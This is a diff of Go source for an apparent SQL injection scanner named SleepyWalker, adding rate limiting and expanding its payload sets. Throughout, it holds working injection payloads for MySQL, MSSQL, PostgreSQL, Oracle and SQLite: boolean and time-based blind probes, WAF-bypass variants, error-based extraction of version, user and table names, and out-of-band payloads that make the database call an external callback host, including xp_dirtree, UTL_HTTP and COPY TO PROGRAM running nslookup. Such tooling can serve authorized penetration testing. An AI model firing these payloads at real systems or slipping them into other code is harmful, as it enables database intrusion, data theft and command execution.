@@ -1,6 +1,7 @@
 package scanner
 
 import (
+	"context"
 	"fmt"
 	"log"
 	"math"
@@ -12,6 +13,7 @@ import (
 	"time"
 
 	"sleepywalker/internal/config"
+	"sleepywalker/internal/utils"
 )
 
 // DeepResult holds the outcome of the deep local validation.
@@ -48,7 +50,7 @@ type techniqueSignal struct {
 //  9. DB-specific confirmation probes (after engine hint from heuristic)
 // 10. Second-order detection stub
 // 11. Out-of-Band (OOB) DNS detection
-func DeepValidate(cfg *config.Config, suspicious []HeuristicResult) []DeepResult {
+func DeepValidate(ctx context.Context, cfg *config.Config, suspicious []HeuristicResult, rl *utils.RateLimiter) []DeepResult {
 	var client *http.Client
 	if cfg != nil {
 		client = cfg.BuildHTTPClient(35 * time.Second)
@@ -63,7 +65,7 @@ func DeepValidate(cfg *config.Config, suspicious []HeuristicResult) []DeepResult
 
 	var results []DeepResult
 	for _, hr := range suspicious {
-		dr := deepProbe(client, cfg, hr)
+		dr := deepProbe(ctx, client, cfg, hr, rl)
 		results = append(results, dr)
 		if dr.Confirmed {
 			log.Printf("[DEEP] ✓ Confirmed (%.0f%% confidence): %s %s — techniques: %v — DB: %s",
@@ -76,23 +78,23 @@ func DeepValidate(cfg *config.Config, suspicious []HeuristicResult) []DeepResult
 }
 
 // deepProbe runs all confirmation techniques against a single entry point.
-func deepProbe(client *http.Client, cfg *config.Config, hr HeuristicResult) DeepResult {
+func deepProbe(ctx context.Context, client *http.Client, cfg *config.Config, hr HeuristicResult, rl *utils.RateLimiter) DeepResult {
 	ep := hr.Entry
 	var signals []techniqueSignal
 	var bestPayload string
 
-	// Pick a target parameter (first available)
-	param := pickParam(ep)
+	// Use the param that Phase 1 actually identified rather than re-picking.
+	param := pickParamFromHeuristic(hr, ep)
 
 	// Detect injection context first to tailor payloads
-	ctx := detectInjectionContext(client, cfg, ep, param)
-	log.Printf("[DEEP]   Injection context for %s param=%s → %s", ep.URL, param, ctx)
+	injCtx := detectInjectionContext(client, cfg, ep, param, rl)
+	log.Printf("[DEEP]   Injection context for %s param=%s → %s", ep.URL, param, injCtx)
 
 	// Detect DB engine hint from heuristic errors
 	dbHint := detectDBFromHeuristicErrors(hr.MatchedErrors)
 
 	// ── 1. Boolean-based blind ──────────────────────────────────────
-	if ok, payload := booleanBlindTest(client, cfg, ep, param, ctx); ok {
+	if ok, payload := booleanBlindTest(client, cfg, ep, param, injCtx, rl); ok {
 		signals = append(signals, techniqueSignal{"boolean-blind", true, 0.25, payload})
 		bestPayload = payload
 	} else {
@@ -100,7 +102,7 @@ func deepProbe(client *http.Client, cfg *config.Config, hr HeuristicResult) Deep
 	}
 
 	// ── 2. Time-based blind (multi-round median) ────────────────────
-	if ok, payload := timeBlindTestStatistical(client, cfg, ep, param, ctx); ok {
+	if ok, payload := timeBlindTestStatistical(client, cfg, ep, param, injCtx, rl); ok {
 		signals = append(signals, techniqueSignal{"time-blind", true, 0.20, payload})
 		if bestPayload == "" {
 			bestPayload = payload
@@ -110,7 +112,7 @@ func deepProbe(client *http.Client, cfg *config.Config, hr HeuristicResult) Deep
 	}
 
 	// ── 3. Error-based confirmation ─────────────────────────────────
-	if ok, payload := errorBasedTest(client, cfg, ep, param); ok {
+	if ok, payload := errorBasedTest(client, cfg, ep, param, rl); ok {
 		signals = append(signals, techniqueSignal{"error-based", true, 0.15, payload})
 		if bestPayload == "" {
 			bestPayload = payload
@@ -120,7 +122,7 @@ func deepProbe(client *http.Client, cfg *config.Config, hr HeuristicResult) Deep
 	}
 
 	// ── 4. UNION-based column count ─────────────────────────────────
-	if ok, payload := unionTest(client, cfg, ep, param); ok {
+	if ok, payload := unionTest(client, cfg, ep, param, rl); ok {
 		signals = append(signals, techniqueSignal{"union-based", true, 0.10, payload})
 		if bestPayload == "" {
 			bestPayload = payload
@@ -130,21 +132,21 @@ func deepProbe(client *http.Client, cfg *config.Config, hr HeuristicResult) Deep
 	}
 
 	// ── 5. Error consistency testing ────────────────────────────────
-	if ok := errorConsistencyTest(client, cfg, ep, param); ok {
+	if ok := errorConsistencyTest(client, cfg, ep, param, rl, hr.TestPayload); ok {
 		signals = append(signals, techniqueSignal{"error-consistency", true, 0.20, ""})
 	} else {
 		signals = append(signals, techniqueSignal{"error-consistency", false, 0.20, ""})
 	}
 
 	// ── 6. HTTP status code correlation ─────────────────────────────
-	if ok := statusCodeCorrelation(client, cfg, ep, param); ok {
+	if ok := statusCodeCorrelation(client, cfg, ep, param, rl); ok {
 		signals = append(signals, techniqueSignal{"status-correlation", true, 0.08, ""})
 	} else {
 		signals = append(signals, techniqueSignal{"status-correlation", false, 0.08, ""})
 	}
 
 	// ── 7. Content-length delta analysis ────────────────────────────
-	if ok := contentLengthDelta(client, cfg, ep, param, ctx); ok {
+	if ok := contentLengthDelta(client, cfg, ep, param, injCtx, rl); ok {
 		signals = append(signals, techniqueSignal{"content-length-delta", true, 0.05, ""})
 	} else {
 		signals = append(signals, techniqueSignal{"content-length-delta", false, 0.05, ""})
@@ -152,7 +154,7 @@ func deepProbe(client *http.Client, cfg *config.Config, hr HeuristicResult) Deep
 
 	// ── 8. DB-specific confirmation probes ──────────────────────────
 	if dbHint != "" {
-		if ok, payload := dbSpecificProbe(client, cfg, ep, param, dbHint); ok {
+		if ok, payload := dbSpecificProbe(client, cfg, ep, param, dbHint, rl); ok {
 			signals = append(signals, techniqueSignal{"db-specific-confirm", true, 0.15, payload})
 			if bestPayload == "" {
 				bestPayload = payload
@@ -163,14 +165,14 @@ func deepProbe(client *http.Client, cfg *config.Config, hr HeuristicResult) Deep
 	}
 
 	// ── 9. Second-order detection ──────────────────────────────
-	if ok := secondOrderStub(client, cfg, ep, param); ok {
+	if ok := secondOrderStub(client, cfg, ep, param, rl); ok {
 		signals = append(signals, techniqueSignal{"second-order", true, 0.12, ""})
 	} else {
 		signals = append(signals, techniqueSignal{"second-order", false, 0.12, ""})
 	}
 
 	// ── 10. Out-of-Band (OOB) detection stub ───────────────────
-	if ok, payload := oobDetectionStub(client, cfg, ep, param, dbHint); ok {
+	if ok, payload := oobDetectionStub(client, cfg, ep, param, dbHint, rl); ok {
 		signals = append(signals, techniqueSignal{"oob-dns", true, 0.10, payload})
 		if bestPayload == "" {
 			bestPayload = payload
@@ -226,9 +228,12 @@ const (
 
 // detectInjectionContext determines whether the parameter is inside a quoted
 // string, a numeric context, or an HTML attribute by analyzing error responses.
-func detectInjectionContext(client *http.Client, cfg *config.Config, ep EntryPoint, param string) injectionContext {
+func detectInjectionContext(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) injectionContext {
+	if rl != nil { rl.Wait() }
 	sqResp := fetchWithPayload(client, cfg, ep, param, "1'")
+	if rl != nil { rl.Wait() }
 	dqResp := fetchWithPayload(client, cfg, ep, param, "1\"")
+	if rl != nil { rl.Wait() }
 	baseline := fetchWithPayload(client, cfg, ep, param, "1")
 
 	if baseline == "" {
@@ -261,6 +266,7 @@ func detectInjectionContext(client *http.Client, cfg *config.Config, ep EntryPoi
 	// Numeric check: only valid when baseline is a clean response (no errors).
 	// If baseline already contains DB errors, numSim will be artificially high.
 	if !baselineHasSyntaxError {
+		if rl != nil { rl.Wait() }
 		numResp := fetchWithPayload(client, cfg, ep, param, "1 AND 1=1")
 		if numResp != "" {
 			numSim := jaccardSimilarity(baseline, numResp)
@@ -287,8 +293,9 @@ func containsAny(s string, subs []string) bool {
 // Technique 1: Boolean-based blind (enhanced with Jaccard similarity)
 // ═══════════════════════════════════════════════════════════════════════
 
-func booleanBlindTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext) (bool, string) {
+func booleanBlindTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext, rl *utils.RateLimiter) (bool, string) {
 	// Get a baseline first
+	if rl != nil { rl.Wait() }
 	baseline := fetchWithPayload(client, cfg, ep, param, "1")
 	if baseline == "" {
 		return false, ""
@@ -317,46 +324,49 @@ func booleanBlindTest(client *http.Client, cfg *config.Config, ep EntryPoint, pa
 			{"1 AND 2>1", "1 AND 1>2"},
 		}
 	default:
-		// Try all contexts
+		// Try all contexts including advanced bypass patterns
 		pairs = []boolPair{
 			{"1 AND 1=1", "1 AND 1=2"},
 			{"1' AND '1'='1", "1' AND '1'='2"},
 			{"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"},
+			{"1') AND ('1'='1", "1') AND ('1'='2"},
+			{"1' AND 1=1-- -", "1' AND 1=2-- -"},
+			{"1' AND 1=1#", "1' AND 1=2#"},
+			// Conditional error: true returns normal, false triggers divide-by-zero
+			{"1'AND(SELECT 1 WHERE 1=1)='1", "1'AND(SELECT 1 WHERE 1=2)='1"},
+			// WAF bypass variants
+			{"1'/*!50000AND*/'1'='1", "1'/*!50000AND*/'1'='2"},
+			{"1'/**/AND/**/1=1-- -", "1'/**/AND/**/1=2-- -"},
 		}
 	}
 
 	for _, pair := range pairs {
-		trueResp := fetchWithPayload(client, cfg, ep, param, pair.truePl)
-		falseResp := fetchWithPayload(client, cfg, ep, param, pair.falsePl)
-
-		if trueResp == "" || falseResp == "" {
-			continue
+		consistent := true
+		for round := 0; round < 2; round++ {
+			if rl != nil { rl.Wait() }
+			trueResp := fetchWithPayload(client, cfg, ep, param, pair.truePl)
+			if rl != nil { rl.Wait() }
+			falseResp := fetchWithPayload(client, cfg, ep, param, pair.falsePl)
+			if trueResp == "" || falseResp == "" {
+				consistent = false
+				break
+			}
+			trueSim := jaccardSimilarity(baseline, trueResp)
+			falseSim := jaccardSimilarity(baseline, falseResp)
+			if !(trueSim > 0.85 && falseSim < 0.70) {
+				// Also check length-based
+				baseLen := len(baseline)
+				trueLen := len(trueResp)
+				falseLen := len(falseResp)
+				trueDiff := math.Abs(float64(trueLen-baseLen)) / math.Max(float64(baseLen), 1)
+				falseDiff := math.Abs(float64(falseLen-baseLen)) / math.Max(float64(baseLen), 1)
+				if !(trueDiff < 0.10 && falseDiff > 0.15) {
+					consistent = false
+					break
+				}
+			}
 		}
-
-		// Jaccard similarity comparison (word-level)
-		trueSim := jaccardSimilarity(baseline, trueResp)
-		falseSim := jaccardSimilarity(baseline, falseResp)
-
-		// True should be similar to baseline (>85%), false should differ (<70%)
-		if trueSim > 0.85 && falseSim < 0.70 {
-			return true, pair.truePl
-		}
-
-		// Also check length-based differential as fallback
-		baseLen := len(baseline)
-		trueLen := len(trueResp)
-		falseLen := len(falseResp)
-
-		trueDiff := math.Abs(float64(trueLen-baseLen)) / math.Max(float64(baseLen), 1)
-		falseDiff := math.Abs(float64(falseLen-baseLen)) / math.Max(float64(baseLen), 1)
-
-		if trueDiff < 0.10 && falseDiff > 0.15 {
-			return true, pair.truePl
-		}
-
-		// True and false differ significantly from each other
-		tfDiff := math.Abs(float64(trueLen-falseLen)) / math.Max(float64(trueLen), 1)
-		if tfDiff > 0.15 && trueDiff < falseDiff {
+		if consistent {
 			return true, pair.truePl
 		}
 	}
@@ -433,12 +443,13 @@ func stripHTMLTags(s string) string {
 // Technique 2: Time-based blind (multi-round statistical)
 // ═══════════════════════════════════════════════════════════════════════
 
-func timeBlindTestStatistical(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext) (bool, string) {
+func timeBlindTestStatistical(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext, rl *utils.RateLimiter) (bool, string) {
 	const rounds = 3
 
 	// Measure baseline timing (3 rounds, take median)
 	var baseTimes []time.Duration
 	for i := 0; i < rounds; i++ {
+		if rl != nil { rl.Wait() }
 		t := measureTime(client, cfg, ep, param, "1")
 		if t < 0 {
 			return false, ""
@@ -454,18 +465,31 @@ func timeBlindTestStatistical(client *http.Client, cfg *config.Config, ep EntryP
 		// MySQL
 		{"1' AND SLEEP(3)-- -", 3},
 		{"1 AND SLEEP(3)-- -", 3},
+		{"1') AND SLEEP(3)-- -", 3},
+		{"1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -", 3},
+		{"1' AND BENCHMARK(5000000,SHA1('test'))-- -", 2},
 		// PostgreSQL
 		{"1'; SELECT pg_sleep(3)-- -", 3},
+		{"1' AND 1=(SELECT 1 FROM pg_sleep(3))-- -", 3},
+		{"1'||(SELECT '' FROM pg_sleep(3))-- -", 3},
 		// MSSQL
 		{"1'; WAITFOR DELAY '0:0:3'-- -", 3},
+		{"1'); WAITFOR DELAY '0:0:3'-- -", 3},
+		{"1' AND 1=1; WAITFOR DELAY '0:0:3'-- -", 3},
+		// Oracle
+		{"1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -", 3},
 		// SQLite (heavy computation as time proxy)
 		{"1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -", 2},
+		// WAF bypass variants
+		{"1'/*!50000AND*/SLEEP(3)-- -", 3},
+		{"1'%20AND%20SLEEP(3)--%20-", 3},
 	}
 
 	for _, dp := range delayPayloads {
 		// Run multiple rounds to reduce noise
 		var timings []time.Duration
 		for i := 0; i < rounds; i++ {
+			if rl != nil { rl.Wait() }
 			elapsed := measureTime(client, cfg, ep, param, dp.payload)
 			if elapsed < 0 {
 				break
@@ -510,7 +534,7 @@ func medianDuration(d []time.Duration) time.Duration {
 // ═══════════════════════════════════════════════════════════════════════
 
 // errorBasedTest uses targeted error-eliciting payloads to confirm injection.
-func errorBasedTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string) (bool, string) {
+func errorBasedTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) (bool, string) {
 	payloads := []struct {
 		payload string
 		errors  []string
@@ -520,18 +544,46 @@ func errorBasedTest(client *http.Client, cfg *config.Config, ep EntryPoint, para
 			[]string{"xpath syntax error", "extractvalue", "operand should contain 1 column"}},
 		{"1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
 			[]string{"xpath syntax error", "updatexml"}},
+		// MySQL double-query error
+		{"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+			[]string{"duplicate entry", "for key", "group_key"}},
+		// MySQL EXP overflow (5.5+)
+		{"1 AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
+			[]string{"double value is out of range", "exp"}},
 		// MSSQL convert error
 		{"1 AND 1=CONVERT(int,(SELECT @@version))-- -",
 			[]string{"conversion failed", "convert", "nvarchar"}},
+		// MSSQL having/group by error
+		{"1' HAVING 1=1-- -",
+			[]string{"not contained in", "aggregate function", "having"}},
+		// MSSQL XML error
+		{"1 AND 1=(SELECT TOP 1 CAST(@@version AS int))-- -",
+			[]string{"conversion failed", "nvarchar value"}},
 		// PostgreSQL cast error
 		{"1 AND 1=CAST((SELECT version()) AS int)-- -",
 			[]string{"invalid input syntax for", "integer"}},
+		// PostgreSQL XMLparse
+		{"1 AND 1=CAST(xmlparse(content '<!INVALID') AS int)-- -",
+			[]string{"invalid xml", "xmlparse", "invalid input syntax"}},
+		// Oracle CTXSYS
+		{"1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+			[]string{"ora-", "drithsx", "29257"}},
+		// Oracle UTL_INADDR
+		{"1 AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+			[]string{"ora-", "network", "host"}},
+		// SQLite unicode/typeof
+		{"1 AND TYPEOF(UNICODE('A'))='integer'-- -",
+			[]string{}},
 		// Generic double-quote / single-quote break
 		{"1'\"",
+			[]string{"syntax error", "unterminated", "unclosed quotation"}},
+		// Parenthetical break
+		{"1')\"",
 			[]string{"syntax error", "unterminated", "unclosed quotation"}},
 	}
 
 	for _, p := range payloads {
+		if rl != nil { rl.Wait() }
 		body := fetchWithPayload(client, cfg, ep, param, p.payload)
 		if body == "" {
 			continue
@@ -554,9 +606,10 @@ func errorBasedTest(client *http.Client, cfg *config.Config, ep EntryPoint, para
 // if any count produces a valid (non-error) response.
 // Enhanced: searches up to 30 columns, uses binary search for efficiency,
 // and tests string marker columns to identify reflecting positions.
-func unionTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string) (bool, string) {
+func unionTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) (bool, string) {
 	// First get a baseline error response (with a bad union)
-	errorBody := fetchWithPayload(client, cfg, ep, param, "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- -")
+	if rl != nil { rl.Wait() }
+	errorBody := fetchWithPayload(client, cfg, ep, param, "1 UNION SELECT-- -")
 
 	errorMarkers := []string{"syntax error", "mismatch", "different number", "operand", "column"}
 
@@ -571,6 +624,7 @@ func unionTest(client *http.Client, cfg *config.Config, ep EntryPoint, param str
 			}
 		}
 		payload := fmt.Sprintf("1 UNION SELECT %s-- -", strings.Join(cols, ","))
+		if rl != nil { rl.Wait() }
 		body := fetchWithPayload(client, cfg, ep, param, payload)
 		if body == "" {
 			return false, payload
@@ -634,8 +688,10 @@ func unionTest(client *http.Client, cfg *config.Config, ep EntryPoint, param str
 
 // errorConsistencyTest fires the same error-inducing payload 3 times and checks
 // if the error appears consistently — flaky responses indicate coincidental matches.
-func errorConsistencyTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string) bool {
-	testPayload := "1'"
+func errorConsistencyTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter, testPl string) bool {
+	if testPl == "" || testPl == "boolean-differential" || testPl == "time-based" {
+		testPl = "1'"
+	}
 	errorKeywords := []string{
 		"syntax error", "you have an error", "unterminated", "unclosed quotation",
 		"ora-", "pg_query", "mysql", "sqlite", "odbc", "jdbc",
@@ -645,7 +701,8 @@ func errorConsistencyTest(client *http.Client, cfg *config.Config, ep EntryPoint
 	const rounds = 3
 
 	for i := 0; i < rounds; i++ {
-		body := fetchWithPayload(client, cfg, ep, param, testPayload)
+		if rl != nil { rl.Wait() }
+		body := fetchWithPayload(client, cfg, ep, param, testPl)
 		if body == "" {
 			continue
 		}
@@ -670,8 +727,9 @@ func errorConsistencyTest(client *http.Client, cfg *config.Config, ep EntryPoint
 
 // statusCodeCorrelation checks if injection payloads consistently trigger
 // 500/503 errors while baseline returns 200.
-func statusCodeCorrelation(client *http.Client, cfg *config.Config, ep EntryPoint, param string) bool {
+func statusCodeCorrelation(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) bool {
 	// Get baseline status
+	if rl != nil { rl.Wait() }
 	baseStatus := fetchStatusCode(client, cfg, ep, param, "1")
 	if baseStatus == 0 || baseStatus >= 400 {
 		return false // baseline already erroring, unreliable
@@ -681,6 +739,7 @@ func statusCodeCorrelation(client *http.Client, cfg *config.Config, ep EntryPoin
 	errorStatusCount := 0
 
 	for _, payload := range errorPayloads {
+		if rl != nil { rl.Wait() }
 		status := fetchStatusCode(client, cfg, ep, param, payload)
 		if status >= 500 {
 			errorStatusCount++
@@ -703,7 +762,20 @@ func fetchStatusCode(client *http.Client, cfg *config.Config, ep EntryPoint, par
 
 // contentLengthDelta measures consistent byte-size differences between
 // tautology and contradiction responses — a reliable blind SQLi indicator.
-func contentLengthDelta(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext) bool {
+func contentLengthDelta(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext, rl *utils.RateLimiter) bool {
+	// Check if same-length neutral values already produce length variance (param reflection).
+	if rl != nil { rl.Wait() }
+	neutral1 := fetchWithPayload(client, cfg, ep, param, "1")
+	if rl != nil { rl.Wait() }
+	neutral2 := fetchWithPayload(client, cfg, ep, param, "2")
+	if neutral1 != "" && neutral2 != "" {
+		neutralDelta := abs(len(neutral1) - len(neutral2))
+		if neutralDelta > 5 {
+			// Page reflects param value — length deltas are unreliable.
+			return false
+		}
+	}
+
 	type pair struct {
 		truePl  string
 		falsePl string
@@ -730,7 +802,9 @@ func contentLengthDelta(client *http.Client, cfg *config.Config, ep EntryPoint, 
 		var deltas []int
 
 		for i := 0; i < rounds; i++ {
+			if rl != nil { rl.Wait() }
 			trueResp := fetchWithPayload(client, cfg, ep, param, p.truePl)
+			if rl != nil { rl.Wait() }
 			falseResp := fetchWithPayload(client, cfg, ep, param, p.falsePl)
 			if trueResp == "" || falseResp == "" {
 				consistent = false
@@ -812,7 +886,7 @@ func detectDBFromHeuristicErrors(errors []string) string {
 
 // dbSpecificProbe fires a DB-specific confirmation payload after the engine
 // has been identified from heuristic errors.
-func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, param, dbEngine string) (bool, string) {
+func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, param, dbEngine string, rl *utils.RateLimiter) (bool, string) {
 	type probe struct {
 		payload    string
 		signatures []string
@@ -827,6 +901,12 @@ func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, par
 				[]string{"xpath syntax error", "~5.", "~8.", "~10."}},
 			{"1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)y)-- -",
 				[]string{"duplicate entry", "for key"}},
+			{"1 AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)-- -",
+				[]string{"xpath syntax error", "updatexml"}},
+			{"1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION(),0x7e)) USING utf8)))-- -",
+				[]string{"invalid json", "json_keys"}},
+			{"1 AND EXP(~(SELECT * FROM (SELECT USER())a))-- -",
+				[]string{"double value is out of range"}},
 		}
 	case "MSSQL":
 		probes = []probe{
@@ -834,12 +914,22 @@ func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, par
 				[]string{"conversion failed", "nvarchar value", "microsoft sql server"}},
 			{"1 AND 1=CONVERT(int, DB_NAME())-- -",
 				[]string{"conversion failed", "nvarchar value"}},
+			{"1 AND 1=CONVERT(int, SYSTEM_USER)-- -",
+				[]string{"conversion failed", "nvarchar"}},
+			{"1' HAVING 1=1-- -",
+				[]string{"not contained in", "aggregate"}},
+			{"1 AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)-- -",
+				[]string{"conversion failed", "subquery"}},
 		}
 	case "PostgreSQL":
 		probes = []probe{
 			{"1 AND 1=CAST((SELECT version()) AS int)-- -",
 				[]string{"invalid input syntax", "integer", "postgresql"}},
 			{"1 AND 1=CAST(current_database() AS int)-- -",
+				[]string{"invalid input syntax", "integer"}},
+			{"1 AND 1=CAST(current_user AS int)-- -",
+				[]string{"invalid input syntax", "integer"}},
+			{"1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- -",
 				[]string{"invalid input syntax", "integer"}},
 		}
 	case "Oracle":
@@ -848,6 +938,10 @@ func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, par
 				[]string{"ora-", "network error"}},
 			{"1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
 				[]string{"ora-", "drithsx"}},
+			{"1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -",
+				[]string{"ora-", "drithsx"}},
+			{"1 AND XMLType((SELECT banner FROM v$version WHERE ROWNUM=1))=1-- -",
+				[]string{"ora-", "lpu-", "xmltype"}},
 		}
 	case "SQLite":
 		probes = []probe{
@@ -855,14 +949,20 @@ func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, par
 				[]string{}}, // success = same as baseline
 			{"1 AND sqlite_version() LIKE '%3%'-- -",
 				[]string{}},
+			{"1 AND 1=CAST(sqlite_version() AS int)-- -",
+				[]string{"no such column", "datatype mismatch"}},
+			{"1 UNION SELECT sql FROM sqlite_master-- -",
+				[]string{"create table", "sqlite_master"}},
 		}
 	default:
 		return false, ""
 	}
 
+	if rl != nil { rl.Wait() }
 	baseline := fetchWithPayload(client, cfg, ep, param, "1")
 
 	for _, p := range probes {
+		if rl != nil { rl.Wait() }
 		body := fetchWithPayload(client, cfg, ep, param, p.payload)
 		if body == "" {
 			continue
@@ -895,7 +995,7 @@ func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, par
 // display URLs for SQL errors — indicating stored/second-order SQL injection.
 // Improved: instead of only re-fetching the exact POST URL, it also checks
 // common related display pages (e.g., /profile, /dashboard, parent path).
-func secondOrderStub(client *http.Client, cfg *config.Config, ep EntryPoint, param string) bool {
+func secondOrderStub(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) bool {
 	// Only applicable for POST entry points with a display/profile page
 	if ep.Method != "POST" {
 		return false
@@ -903,12 +1003,6 @@ func secondOrderStub(client *http.Client, cfg *config.Config, ep EntryPoint, par
 
 	// Use a marker that would cause an error if it gets into a SQL query
 	marker := "sw_probe_1'" // single-quote to break SQL context
-
-	// Store the marker using the unified helper to ensure headers/cookies/method are correct.
-	_, _, err := fetchParamWithPayloadWithStatus(client, cfg, ep, param, marker)
-	if err != nil {
-		return false
-	}
 
 	// Build a list of candidate display URLs to check for reflected errors.
 	candidateURLs := inferRelatedDisplayURLs(ep.URL)
@@ -919,23 +1013,38 @@ func secondOrderStub(client *http.Client, cfg *config.Config, ep EntryPoint, par
 		"sqlite", "jdbc", "odbc",
 	}
 
+	// Fetch baselines BEFORE injecting marker.
+	baselineResponses := make(map[string]string)
 	for _, checkURL := range candidateURLs {
 		req, err := http.NewRequest("GET", checkURL, nil)
-		if err != nil {
-			continue
-		}
+		if err != nil { continue }
 		req.Header.Set("User-Agent", "SleepyWalker/1.0")
-		if cfg != nil {
-			cfg.ApplyHeaders(req)
-		}
+		if cfg != nil { cfg.ApplyHeaders(req) }
+		if rl != nil { rl.Wait() }
 		body, _, err := doRequestWithStatus(client, req)
-		if err != nil {
-			continue
-		}
+		if err != nil { continue }
+		baselineResponses[checkURL] = body
+	}
 
+	// Inject marker.
+	if rl != nil { rl.Wait() }
+	_, _, err := fetchParamWithPayloadWithStatus(client, cfg, ep, param, marker)
+	if err != nil { return false }
+
+	// Check for NEW errors in display pages.
+	for _, checkURL := range candidateURLs {
+		req, err := http.NewRequest("GET", checkURL, nil)
+		if err != nil { continue }
+		req.Header.Set("User-Agent", "SleepyWalker/1.0")
+		if cfg != nil { cfg.ApplyHeaders(req) }
+		if rl != nil { rl.Wait() }
+		body, _, err := doRequestWithStatus(client, req)
+		if err != nil { continue }
 		lower := strings.ToLower(body)
+		baseLower := strings.ToLower(baselineResponses[checkURL])
 		for _, sign := range errorSigns {
-			if strings.Contains(lower, sign) {
+			// Only flag if error is NEW (not in baseline).
+			if strings.Contains(lower, sign) && !strings.Contains(baseLower, sign) {
 				log.Printf("[DEEP]   Second-order: POST %s → GET %s triggered SQL error", ep.URL, checkURL)
 				return true
 			}
@@ -1018,14 +1127,14 @@ func inferRelatedDisplayURLs(postURL string) []string {
 // If any payload causes a response change (status shift, error message),
 // it also counts as a positive signal. The actual DNS callback check is
 // left to external tools (e.g., interactsh) or future integration.
-func oobDetectionStub(client *http.Client, cfg *config.Config, ep EntryPoint, param, dbHint string) (bool, string) {
+func oobDetectionStub(client *http.Client, cfg *config.Config, ep EntryPoint, param, dbHint string, rl *utils.RateLimiter) (bool, string) {
 	oobDomain := os.Getenv("SLEEPYWALKER_OOB_DOMAIN")
 	if oobDomain == "" {
 		return false, ""
 	}
 
 	// Generate a unique subdomain per probe for callback correlation.
-	marker := fmt.Sprintf("sw%d", time.Now().UnixNano()%100000)
+	marker := fmt.Sprintf("sw%x", time.Now().UnixNano()%0xFFFFFFFF)
 	callbackHost := fmt.Sprintf("%s.%s", marker, oobDomain)
 
 	// DB-specific OOB payloads.
@@ -1039,9 +1148,16 @@ func oobDetectionStub(client *http.Client, cfg *config.Config, ep EntryPoint, pa
 	// Always fire the generic payloads; add DB-specific ones if we have a hint.
 	payloads = append(payloads,
 		oobPayload{"MySQL", fmt.Sprintf("1' AND LOAD_FILE('\\\\\\\\%s\\\\a')-- -", callbackHost)},
+		oobPayload{"MySQL", fmt.Sprintf("1' AND LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.%s\\\\a'))-- -", callbackHost)},
+		oobPayload{"MySQL", fmt.Sprintf("1' UNION SELECT LOAD_FILE('\\\\\\\\%s\\\\a')-- -", callbackHost)},
 		oobPayload{"MSSQL", fmt.Sprintf("1'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", callbackHost)},
+		oobPayload{"MSSQL", fmt.Sprintf("1'; EXEC master..xp_fileexist '\\\\\\\\%s\\\\a'-- -", callbackHost)},
+		oobPayload{"MSSQL", fmt.Sprintf("1'; DECLARE @q varchar(999);SET @q='\\\\\\\\%s\\\\a';EXEC master..xp_dirtree @q-- -", callbackHost)},
 		oobPayload{"Oracle", fmt.Sprintf("1' AND 1=UTL_INADDR.GET_HOST_ADDRESS('%s')-- -", callbackHost)},
+		oobPayload{"Oracle", fmt.Sprintf("1' AND 1=UTL_HTTP.REQUEST('http://%s/')-- -", callbackHost)},
+		oobPayload{"Oracle", fmt.Sprintf("1' AND DBMS_LDAP.INIT('%s',80) IS NOT NULL-- -", callbackHost)},
 		oobPayload{"PostgreSQL", fmt.Sprintf("1'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", callbackHost)},
+		oobPayload{"PostgreSQL", fmt.Sprintf("1' AND 1=(SELECT dblink_connect('host=%s'))-- -", callbackHost)},
 	)
 
 	// If we have a DB hint, try those first.
@@ -1051,9 +1167,11 @@ func oobDetectionStub(client *http.Client, cfg *config.Config, ep EntryPoint, pa
 		})
 	}
 
